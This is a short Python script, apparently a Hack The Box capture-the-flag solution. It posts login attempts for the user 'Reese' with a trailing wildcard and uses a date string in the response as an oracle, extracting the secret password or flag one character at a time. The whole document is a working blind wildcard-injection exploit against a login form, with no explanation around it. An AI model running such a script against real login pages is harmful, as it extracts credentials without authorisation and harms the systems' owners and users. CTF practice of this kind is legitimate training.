import requests
import json

results = []
num_range = "abcdefghijklmnopqrstvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ#$%@!0123456789{}[]_&^ "
password = "HTB{d"
while 1 == 1:
    for x in range(len(num_range)):
        req = requests.session()
        url = "URL"
        data = {"username":"Reese",
                "password":password+num_range[x]+"*"}
        r = req.post(url=url, data=data)
        #print(r.content)
        if "9.8.2020" not in str(r.content):
            password += num_range[x]
            break
    print(password)
